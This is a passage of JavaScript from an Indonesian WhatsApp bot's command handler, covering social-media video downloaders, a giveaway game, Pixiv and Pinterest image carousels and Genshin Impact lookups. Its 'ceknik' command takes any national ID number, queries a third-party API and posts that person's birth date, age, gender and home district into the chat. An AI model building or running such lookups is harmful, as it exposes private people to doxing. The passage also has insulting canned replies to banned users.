                let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
                qyuunee.sendMessage(m.chat, { document: { url: url }, fileName: filename, mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
            .catch(console.error)
            break

case 'tt':
case 'tiktok':
case 'tiktokmp4': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
			if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
			loading()
			let res = await tiktok2(`${args[0]}`)
				qyuunee.sendMessage(m.chat, { video: { url: res.no_watermark }, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
				qyuunee.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
			})
			}
			break

case 'tiktokht':
case 'tthastag':
case 'ttsearch': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
			if (args.length == 0) return reply(`Example: ${prefix + command} lumine`)
			loading()
			try {
    let res = await tiktoks(`${full_args}`)
      qyuunee.sendMessage(m.chat, { video: { url: res.no_watermark }, caption: res.title, mimetype: 'video/mp4' })
  } catch (e) {
    reply(`Terjadi Kesalahan, Tidak Dapat Mengambil Data Dari API !`);
  }
  }
break

case "giveaway": {
    const args = text.split(' ');
    const subCommand = args[0];
    const subArgs = args.slice(1).join(' ');

    if (subCommand === "mulai") {
        if (!isAdmins) {
            await qyuunee.sendMessage(
                m.chat,
                { text: mess.owner },
                { quoted: m }
            );
        } else if (!subArgs) {
            await qyuunee.sendMessage(
                m.chat,
                { text: `Contoh:\n${prefix}giveaway mulai Uang 1k` },
                { quoted: m }
            );
        } else {
            giveawayStatus = true;
            giveawayName = subArgs;
            giveawayUser = {};
            await qyuunee.sendMessage(
                m.chat,
                { text: `Giveaway "${subArgs}" telah dimulai!\nJika ingin ikut, ketik:\n${prefix}giveaway ikut` },
                { quoted: m }
            );
        }
    } else if (subCommand === "ikut") {
        if (!giveawayStatus) {
            await qyuunee.sendMessage(
                m.chat,
                { text: `Tidak ada giveaway yang berlangsung saat ini.` },
                { quoted: m }
            );
        } else if (giveawayUser[m.sender]) {
            await qyuunee.sendMessage(
                m.chat,
                { text: `Kamu sudah terdaftar dalam giveaway.` },
                { quoted: m }
            );
        } else {
            giveawayUser[m.sender] = true;
            await qyuunee.sendMessage(
                m.chat,
                { text: `Kamu telah bergabung dalam giveaway "${giveawayName}"!` },
                { quoted: m }
            );
        }
    } else if (subCommand === "tutup") {
        if (!isAdmins) {
            await qyuunee.sendMessage(
                m.chat,
                { text: mess.owner },
                { quoted: m }
            );
        } else {
            giveawayStatus = false;
            await qyuunee.sendMessage(
                m.chat,
                { text: `Giveaway "${giveawayName}" telah ditutup!` },
                { quoted: m }
            );
        }
    } else if (subCommand === "acak") {
        if (!isAdmins) {
            await qyuunee.sendMessage(
                m.chat,
                { text: mess.owner },
                { quoted: m }
            );
        } else {
            const users = Object.keys(giveawayUser);
            if (users.length === 0) {
                await qyuunee.sendMessage(
                    m.chat,
                    { text: `Tidak ada peserta dalam giveaway.` },
                    { quoted: m }
                );
            } else {
                const initialMessage = await qyuunee.sendMessage(
                    m.chat,
                    { text: `Memilih pemenang giveaway "${giveawayName}"...` },
                    { quoted: m }
                );

                const winner = users[Math.floor(Math.random() * users.length)];
                const winnerMention = `@${winner.split('@')[0]}`;

                const displayWinners = [];
                for (let i = 0; i < 8; i++) {
                    displayWinners.push(users[Math.floor(Math.random() * users.length)]);
                }

                const editMessageWithDelay = async (text, mentions, delay) => {
                    return new Promise((resolve) => {
                        setTimeout(async () => {
                            await qyuunee.sendMessage(
                                m.chat,
                                {
                                    text: text,
                                    edit: initialMessage.key,
                                    mentions: mentions
                                },
                                { quoted: m }
                            );
                            resolve();
                        }, delay);
                    });
                };

                const delays = [100, 200, 300, 400, 500, 650, 800, 1000];
                for (let i = 0; i < displayWinners.length; i++) {
                    const currentWinner = displayWinners[i];
                    await editMessageWithDelay(
                        `Selamat! Pemenang dari giveaway "${giveawayName}" adalah @${currentWinner.split('@')[0]}`,
                        [currentWinner],
                        delays[i]
                    );
                }

                await editMessageWithDelay(
                    `Selamat! Pemenang dari giveaway "${giveawayName}" adalah @${winner.split('@')[0]}`,
                    [winner],
                    delays[delays.length - 1] + 1000
                );

                await qyuunee.sendMessage(
                    m.chat,
                    {
                        text: `Harap Pemenang Konfirmasi Ke Penyelenggara Jika Tidak Akan Hangus!`,
                        mentions: [winner]
                    },
                    { quoted: m }
                );
            }
        }
    } else if (subCommand === "hapus") {
        if (!isAdmins) {
            await qyuunee.sendMessage(
                m.chat,
                { text: mess.owner },
                { quoted: m }
            );
        } else {
            giveawayStatus = false;
            giveawayName = '';
            giveawayUser = {};
            await qyuunee.sendMessage(
                m.chat,
                { text: `Giveaway telah direset!` },
                { quoted: m }
            );
        }
    } else if (subCommand === "reroll") {
        if (!isAdmins) {
            await qyuunee.sendMessage(
                m.chat,
                { text: mess.owner },
                { quoted: m }
            );
        } else {
            const users = Object.keys(giveawayUser);
            if (users.length === 0) {
                await qyuunee.sendMessage(
                    m.chat,
                    { text: `Tidak ada peserta dalam giveaway.` },
                    { quoted: m }
                );
            } else {
                let numToEliminate = Math.max(1, Math.floor(users.length * 0.25));
                
                if (users.length <= 5) {
                    numToEliminate = 1;
                }

                const eliminatedUsers = [];
                
                while (eliminatedUsers.length < numToEliminate) {
                    const index = Math.floor(Math.random() * users.length);
                    const user = users[index];
                    if (!eliminatedUsers.includes(user)) {
                        eliminatedUsers.push(user);
                        delete giveawayUser[user];
                    }
                }
                
                const remainingUsers = Object.keys(giveawayUser);
                
                if (remainingUsers.length <= 1) {
                    giveawayStatus = false;
                    const winner = remainingUsers[0];
                    await qyuunee.sendMessage(
                        m.chat,
                        {
                            text: `Giveaway "${giveawayName}" telah selesai!\nPemenangnya adalah @${winner.split('@')[0]}!`,
                            mentions: [winner]
                        },
                        { quoted: m }
                    );
                } else {
                    await qyuunee.sendMessage(
                        m.chat,
                        {
                            text: `Pengguna yang tereliminasi:\n${eliminatedUsers.map(user => `@${user.split('@')[0]}`).join('\n')}\nSisa peserta: ${remainingUsers.length}`
                        },
                        { quoted: m }
                    );
                }
            }
        }
    } else {
        await qyuunee.sendMessage(
            m.chat,
            { text: `Perintah tidak dikenal.\nGunakan salah satu dari: mulai, ikut, tutup, acak, hapus, reroll.\nContoh: ${prefix}giveaway ikut` },
            { quoted: m }
        );
    }
}
break

/* `
*/

case'ceknik':{
if (!text) return reply(`*Example:* ${prefix + command} Nik KTP`)
let telaso = await fetchJson(`https://api.kyuurzy.site/api/search/ceknik?query=${text}`)
qyuunee.sendMessage(m.chat, { text: `Status: *${telaso.result.status}*\nPesan : ${telaso.result.pesan}\n\nNik : *${telaso.result.data.nik}*\nKelamin : *${telaso.result.data.kelamin}*\nLahir : *${telaso.result.data.lahir}*\nProvinsi : *${telaso.result.data.provinsi}*\nKota/Kabupaten : *${telaso.result.data.kotakab}*\nKecamatan : *${telaso.result.data.kecamatan}*\nUniqcode : *${telaso.result.data.uniqcode}*\nKodepos : *${telaso.result.data.tambahan.kodepos}*\nPasaran : *${telaso.result.data.tambahan.pasaran}*\nUmur : *${telaso.result.data.tambahan.usia}*\nUltah : *${telaso.result.data.tambahan.ultah}*\nZodiak : *${telaso.result.data.tambahan.zodiak}*\n\n*Check Nik KTP (Not a Doxing Feature!!!*)`},{quoted:koi})
}
break

case 'ttslide':
case 'tiktokslide': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
			if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
			if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
			loading()
			const limit = parseInt(args[0]) || 9;
			try {
    const allImages = [];
    let res = await fetch(`https://vihangayt.me/download/tiktokimg?url=${args[0]}`);
    let json = await res.json();
    if (json.data.length > 0) {
      allImages.push(...json.data);
    }
    const validImages = await filterValidImages(allImages, limit);
    for (const image of validImages) {
      qyuunee.sendMessage(m.chat, { image: { url: image }})
    }
  } catch (e) {
    reply(`Terjadi Kesalahan, Tidak Dapat Mengambil Data Dari API !`);
  }
			/*axios.get(`https://vihangayt.me/download/tiktokimg?url=${args[0]}`).then(({ data }) => {
			ttslide(q).then( data => {
				qyuunee.sendMessage(m.chat, { image: { url: data.imgSrc[0] }})
			})*/
			}
			break
			
case 'tiktokmp3':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
			if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
			loading()
			let res = await tiktok2(`${args[0]}`)
			qyuunee.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
			.catch(console.error)
			break

case 'twiter': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
			if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
			loading()
			let res = await fetchJson(`https://api.junn4.my.id/download/twitter?url=${args[0]}`);
			qyuunee.sendMessage(m.chat, { video: { url: res.result.video }}, {quoted: m})
			}
			break
			
case 'igdl': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	  if (!text) return reply(`You need to give the URL of Any Instagram video, post, reel, image`)
  let res
  try {
    res = await fetch(`https://pixiv-nsfw.vercel.app/igdl?url=${text}`)
  } catch (error) {
    return reply(`An error occurred: ${error.message}`)
  }
  let api_response = await res.json()
  if (!api_response || !api_response.video) {
    return reply(`No video or image found or Invalid response from API.`)
  }
  qyuunee.sendFile(m.chat, `${api_response.video}`, 'file', m)
}
break

case 'fb':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
if (args.length == 0) return reply(`Link?`)
loading()
try {
axios.get(`https://api.junn4.my.id/download/facebook?url=${args[0]}`).then(({ data }) => {
let cap = `🍂 Done...`
qyuunee.sendMessage(m.chat, { video: { url: data.result.video_hd }, caption: cap })
})
} catch (e) {
reply(mess.error)
}
break

case 'ytvid':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
			if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
			loading()
			downloadMp4(text)
			break

case "ssweb":{
if (!q) return reply(`Contoh ${prefix+command} link`)
reply(mess.wait)
global.sh = q
let krt = await ssweb(global.sh)
qyuunee.sendMessage(from ,{ image: krt.result, caption: mess.success },{ quoted: m })
}
break

/*case 'ytmp4': {
    if (!text) return m.reply("Linknya?");
    loading()
    try {
        const yt = new y2mate();
        const result = await yt.play(text); 
        const title = result.title;
        qyuunee.sendMessage(m.chat, { video: { url: result.video['360p'].url }, caption: `🚀` }, { quoted: m })
    } catch (error) {
        m.reply("Terjadi kesalahan, coba lagi nanti!");
        console.error(error); 
    }
}
break*/

case 'ytmp4':
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
			if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
			loading()
			downloadMp4(text)
			break

case 'wm': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
let teks = `${text}`
try {
 if (!quoted) reply `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await qyuunee.sendImageAsSticker(from, media, m, { packname: `${teks}`, author: `` })
await fs.unlinkSync(encmedia)
}
} catch (e) {
reply(mess.error)
console.error(e)
}
}
break

case 'wmvideo':{
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
let teks = `${text}`
try {
 if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
if (/video/.test(mime)) {
let media = await quoted.download()
let encmedia = await qyuunee.sendVideoAsSticker(from, media, m, { packname: `${teks}`, author: `` })
await fs.unlinkSync(encmedia)
} else {
reply `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
} catch (e) {
reply(mess.error)
}
}
break

case 'pin':
        case 'pintesert':
          {
          if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
            if (!args[0]) {
              return reply("Masukan Query");
            }
            const _0x4b503c = await (await fetch("https://pixiv-nsfw.vercel.app/pinhd?q=" + full_args)).json();
            const _0x1ac508 = '' + _0x4b503c.img[1];
            const _0x421582 = '' + _0x4b503c.img[2];
            const _0x1b113d = '' + _0x4b503c.img[3];
            const _0x13ff04 = '' + _0x4b503c.img[4];
            const _0x3f39cf = '' + _0x4b503c.img[5];
            let me = m.sender
            async function _0x266d3f(_0x43f047) {
              const _0x550749 = {
                url: _0x43f047
              };
              const _0x47b687 = {
                image: _0x550749
              };
              const _0x4b9e83 = {
                upload: qyuunee.waUploadToServer
              };
              const {
                imageMessage: _0x13d757
              } = await prepareWAMessageMedia(_0x47b687, _0x4b9e83);
              return _0x13d757;
            }
            const _0x35ec0d = {
              text: "Here " + `@${me.split('@')[0]}` + ", this your result image"
            };
            let msg = generateWAMessageFromContent(m.chat, {
              "viewOnceMessage": {
                "message": {
                  "interactiveMessage": {
                    "body": _0x35ec0d,
                    "carouselMessage": {
                      "cards": [{
                        "header": {
                          "imageMessage": await _0x266d3f(_0x1ac508),
                          "hasMediaAttachment": true
                        },
                        "body": {
                          "text": "Image 1/5"
                        },
                        "nativeFlowMessage": {
                          "buttons": [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"CLICK HERE\",\"url\":\"https://id.pinterest.com/search/pins/?rs=typed&q=${full_args}\",\"webview_presentation\":null}`
                          }]
                        }
                      }, {
                        "header": {
                          "imageMessage": await _0x266d3f(_0x421582),
                          "hasMediaAttachment": true
                        },
                        "body": {
                          "text": "Image 2/5"
                        },
                        "nativeFlowMessage": {
                          "buttons": [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"CLICK HERE\",\"url\":\"https://id.pinterest.com/search/pins/?rs=typed&q=${full_args}\",\"webview_presentation\":null}`
                          }]
                        }
                      }, {
                        "header": {
                          "imageMessage": await _0x266d3f(_0x1b113d),
                          "hasMediaAttachment": true
                        },
                        "body": {
                          "text": "Image 3/5"
                        },
                        "nativeFlowMessage": {
                          "buttons": [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"CLICK HERE\",\"url\":\"https://id.pinterest.com/search/pins/?rs=typed&q=${full_args}\",\"webview_presentation\":null}`
                          }]
                        }
                      }, {
                        "header": {
                          "imageMessage": await _0x266d3f(_0x13ff04),
                          "hasMediaAttachment": true
                        },
                        "body": {
                          "text": "Image 4/5"
                        },
                        "nativeFlowMessage": {
                          "buttons": [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"CLICK HERE\",\"url\":\"https://id.pinterest.com/search/pins/?rs=typed&q=${full_args}\",\"webview_presentation\":null}`
                          }]
                        }
                      }, {
                        "header": {
                          "imageMessage": await _0x266d3f(_0x3f39cf),
                          "hasMediaAttachment": true
                        },
                        "body": {
                          "text": "Image 5/5"
                        },
                        "nativeFlowMessage": {
                          "buttons": [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"CLICK HERE\",\"url\":\"https://id.pinterest.com/search/pins/?rs=typed&q=${full_args}\",\"webview_presentation\":null}`
                          }]
                        }
                      }],
                      "messageVersion": 0x1
                    },
                    contextInfo: {
                  mentionedJid: [me], 
                  forwardingScore: 999,
                  isForwarded: false
                }
                  }
                }
              }
            }, {});
            await qyuunee.relayMessage(msg.key.remoteJid, msg.message, {
              "messageId": msg.key.id
            });
          }
          break;

case 'pixiv': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
if (!args[0]) {
              return reply("Masukan Query");
            }
            const _0x4b503c = await (await fetch(`https://widipe.com/pixiv?query=${args[0]}`)).json();
            const _0x1ac508 = '' + _0x4b503c.result[1].urls.regular;
            const _0x421582 = '' + _0x4b503c.result[2].urls.regular;
            const _0x1b113d = '' + _0x4b503c.result[6].urls.regular;
            const _0x13ff04 = '' + _0x4b503c.result[4].urls.regular;
            const _0x3f39cf = '' + _0x4b503c.result[5].urls.regular;
            let me = m.sender
            async function _0x266d3f(_0x43f047) {
              const _0x550749 = {
                url: _0x43f047
              };
              const _0x47b687 = {
                image: _0x550749
              };
              const _0x4b9e83 = {
                upload: qyuunee.waUploadToServer
              };
              const {
                imageMessage: _0x13d757
              } = await prepareWAMessageMedia(_0x47b687, _0x4b9e83);
              return _0x13d757;
            }
            const _0x35ec0d = {
              text: "Here " + `@${me.split('@')[0]}` + ", this your result image"
            };
            let msg = generateWAMessageFromContent(m.chat, {
              "viewOnceMessage": {
                "message": {
                  "interactiveMessage": {
                    "body": _0x35ec0d,
                    "carouselMessage": {
                      "cards": [{
                        "header": {
                          "imageMessage": await _0x266d3f(_0x1ac508),
                          "hasMediaAttachment": true
                        },
                        "body": {
                          "text": "Image 1/5"
                        },
                        "nativeFlowMessage": {
                          "buttons": [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"CLICK HERE\",\"url\":\"https://www.pixiv.net/en/tags/${full_args}/illustrations?p=1\",\"webview_presentation\":null}`
                          }]
                        }
                      }, {
                        "header": {
                          "imageMessage": await _0x266d3f(_0x421582),
                          "hasMediaAttachment": true
                        },
                        "body": {
                          "text": "Image 2/5"
                        },
                        "nativeFlowMessage": {
                          "buttons": [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"CLICK HERE\",\"url\":\"https://www.pixiv.net/en/tags/${full_args}/illustrations?p=1\",\"webview_presentation\":null}`
                          }]
                        }
                      }, {
                        "header": {
                          "imageMessage": await _0x266d3f(_0x1b113d),
                          "hasMediaAttachment": true
                        },
                        "body": {
                          "text": "Image 3/5"
                        },
                        "nativeFlowMessage": {
                          "buttons": [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"CLICK HERE\",\"url\":\"https://www.pixiv.net/en/tags/${full_args}/illustrations?p=1\",\"webview_presentation\":null}`
                          }]
                        }
                      }, {
                        "header": {
                          "imageMessage": await _0x266d3f(_0x13ff04),
                          "hasMediaAttachment": true
                        },
                        "body": {
                          "text": "Image 4/5"
                        },
                        "nativeFlowMessage": {
                          "buttons": [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"CLICK HERE\",\"url\":\"https://www.pixiv.net/en/tags/${full_args}/illustrations?p=1\",\"webview_presentation\":null}`
                          }]
                        }
                      }, {
                        "header": {
                          "imageMessage": await _0x266d3f(_0x3f39cf),
                          "hasMediaAttachment": true
                        },
                        "body": {
                          "text": "Image 5/5"
                        },
                        "nativeFlowMessage": {
                          "buttons": [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"CLICK HERE\",\"url\":\"https://www.pixiv.net/en/tags/${full_args}/illustrations?p=1\",\"webview_presentation\":null}`
                          }]
                        }
                      }],
                      "messageVersion": 0x1
                    },
                    contextInfo: {
                  mentionedJid: [me], 
                  forwardingScore: 999,
                  isForwarded: false
                }
                  }
                }
              }
            }, {});
            await qyuunee.relayMessage(msg.key.remoteJid, msg.message, {
              "messageId": msg.key.id
            });
}
break

case 'pixiv2': {
if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
if (!args[0]) {
              return reply("Masukan Query");
            }
            const _0x4b503c = await (await fetch(`https://pixiv-nsfw.vercel.app/search?q=${full_args}`)).json();
            const _0x1ac508 = '' + _0x4b503c[1].origin_url;
            const _0x421582 = '' + _0x4b503c[2].origin_url;
            const _0x1b113d = '' + _0x4b503c[3].origin_url;
            const _0x13ff04 = '' + _0x4b503c[4].origin_url;
            const _0x3f39cf = '' + _0x4b503c[5].origin_url;
            let me = m.sender
            async function _0x266d3f(_0x43f047) {
              const _0x550749 = {
                url: _0x43f047
              };
              const _0x47b687 = {
                image: _0x550749
              };
              const _0x4b9e83 = {
                upload: qyuunee.waUploadToServer
              };
              const {
                imageMessage: _0x13d757
              } = await prepareWAMessageMedia(_0x47b687, _0x4b9e83);
              return _0x13d757;
            }
            const _0x35ec0d = {
              text: "Here " + `@${me.split('@')[0]}` + ", this your result image"
            };
            let msg = generateWAMessageFromContent(m.chat, {
              "viewOnceMessage": {
                "message": {
                  "interactiveMessage": {
                    "body": _0x35ec0d,
                    "carouselMessage": {
                      "cards": [{
                        "header": {
                          "imageMessage": await _0x266d3f(_0x1ac508),
                          "hasMediaAttachment": true
                        },
                        "body": {
                          "text": "Image 1/5"
                        },
                        "nativeFlowMessage": {
                          "buttons": [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"CLICK HERE\",\"url\":\"https://www.pixiv.net/en/tags/${full_args}/illustrations?p=1\",\"webview_presentation\":null}`
                          }]
                        }
                      }, {
                        "header": {
                          "imageMessage": await _0x266d3f(_0x421582),
                          "hasMediaAttachment": true
                        },
                        "body": {
                          "text": "Image 2/5"
                        },
                        "nativeFlowMessage": {
                          "buttons": [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"CLICK HERE\",\"url\":\"https://www.pixiv.net/en/tags/${full_args}/illustrations?p=1\",\"webview_presentation\":null}`
                          }]
                        }
                      }, {
                        "header": {
                          "imageMessage": await _0x266d3f(_0x1b113d),
                          "hasMediaAttachment": true
                        },
                        "body": {
                          "text": "Image 3/5"
                        },
                        "nativeFlowMessage": {
                          "buttons": [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"CLICK HERE\",\"url\":\"https://www.pixiv.net/en/tags/${full_args}/illustrations?p=1\",\"webview_presentation\":null}`
                          }]
                        }
                      }, {
                        "header": {
                          "imageMessage": await _0x266d3f(_0x13ff04),
                          "hasMediaAttachment": true
                        },
                        "body": {
                          "text": "Image 4/5"
                        },
                        "nativeFlowMessage": {
                          "buttons": [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"CLICK HERE\",\"url\":\"https://www.pixiv.net/en/tags/${full_args}/illustrations?p=1\",\"webview_presentation\":null}`
                          }]
                        }
                      }, {
                        "header": {
                          "imageMessage": await _0x266d3f(_0x3f39cf),
                          "hasMediaAttachment": true
                        },
                        "body": {
                          "text": "Image 5/5"
                        },
                        "nativeFlowMessage": {
                          "buttons": [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"CLICK HERE\",\"url\":\"https://www.pixiv.net/en/tags/${full_args}/illustrations?p=1\",\"webview_presentation\":null}`
                          }]
                        }
                      }],
                      "messageVersion": 0x1
                    },
                    contextInfo: {
                  mentionedJid: [me], 
                  forwardingScore: 999,
                  isForwarded: false
                }
                  }
                }
              }
            }, {});
            await qyuunee.relayMessage(msg.key.remoteJid, msg.message, {
              "messageId": msg.key.id
            });
}
break

case 'enka':
            case 'profilgi':
            if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
			if (args.length == 0) return reply(`Example: ${prefix + command} 800000001`)
			global.sh = `https://enka.network/u/${args[0]}`
let krt = await ssweb(global.sh)
			axios.get(`https://enka.network/api/uid/${args[0]}?info`).then(({ data }) => {
				var caption = `▧「 *P R O F I L E  G E N S H I N* 」\n\n ‣ *Nickname* : *${data.playerInfo.nickname}*\n`
				caption += ` ‣ *Adventure Rank* : *${data.playerInfo.level}*\n`
				caption += ` ‣ *Signature* : *${data.playerInfo.signature}*\n`
				caption += ` ‣ *World Level* : *${data.playerInfo.worldLevel}*\n\n`
				caption += ` ‣ *Achievement* : *${data.playerInfo.finishAchievementNum}*\n`
				caption += ` ‣ *Abyss* : *Floor ${data.playerInfo.towerFloorIndex} Chamber ${data.playerInfo.towerLevelIndex}*\n\n`
				caption += `▧ *Mau Lebih Lengkap? Cek Disini :*\nhttps://enka.network/u/${args[0]}\n`
				qyuunee.sendMessage(from ,{ image: krt.result, caption: caption },{ quoted: m })
			})
			.catch(console.error)
			break

case 'buildgi':
			case 'build': {
            if (args.length == 0) return reply(`‣ *Example:* ${prefix + command} hutao\n\n‣ *List Character:* ${prefix + command} list`)
                if (args[0] === "albedo") {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Albedo_Sub DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'hutao') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Hu Tao_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'alhaitam') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Alhaitham_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'aloy') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Aloy_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Aloy_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                 } else if (args[0] === 'amber') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Amber_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Amber_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'itto') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Arataki Itto_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'baizhu') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Baizhu_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'barbara') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Barbara_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'beidou') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Beidou_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'bennet') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Bennett_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Bennett_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'candace') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Candace_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'chongyun') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Chongyun_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'collei') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Collei_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'cyno') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Cyno_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'dehya') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Dehya_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'diluc') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Diluc_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'diona') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Diona_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'dori') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Dori_Healer.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'eula') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Eula_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'faruzan') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Faruzan_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'fischl') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Fischl_Aggravate.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Fischl_Sub DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'ganyu') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Ganyu_Burst DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Ganyu_Main DPS.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'gorou') {
                    qyuunee.sendMessage(m.chat, { image:  fs.readFileSync('./build/Gorou_Support.jpg'), caption:`*Ini Kak Build ${args[0]}-nya :3*`},{ quoted: m })
                } else if (args[0] === 'jean') {
